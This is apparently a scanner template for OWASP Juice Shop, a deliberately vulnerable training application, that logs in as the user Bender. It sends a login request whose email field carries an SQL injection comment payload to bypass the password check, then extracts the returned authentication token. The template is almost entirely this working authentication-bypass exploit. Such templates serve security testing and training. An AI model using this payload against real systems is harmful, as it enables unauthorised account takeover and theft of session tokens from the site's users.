id: juice-shop-login-bender

info:
  name: Login Bender
  author: yelaco
  severity: high
  tags: juice-shop,sqli,login
  description: Log in with Benderâ€™s user account

requests:
  - method: POST
    path:
      - "{{BaseURL}}/rest/user/login"

    headers:
      Content-Type: application/json

    body: |
      {
        "email": "bender@juice-sh.op'--",
        "password": "irrelevant"
      }

    matchers:
      - type: word
        part: body
        words:
          - "authentication"
          - "token"
        condition: and

    extractors:
      - type: json
        json:
          - ".authentication.token"
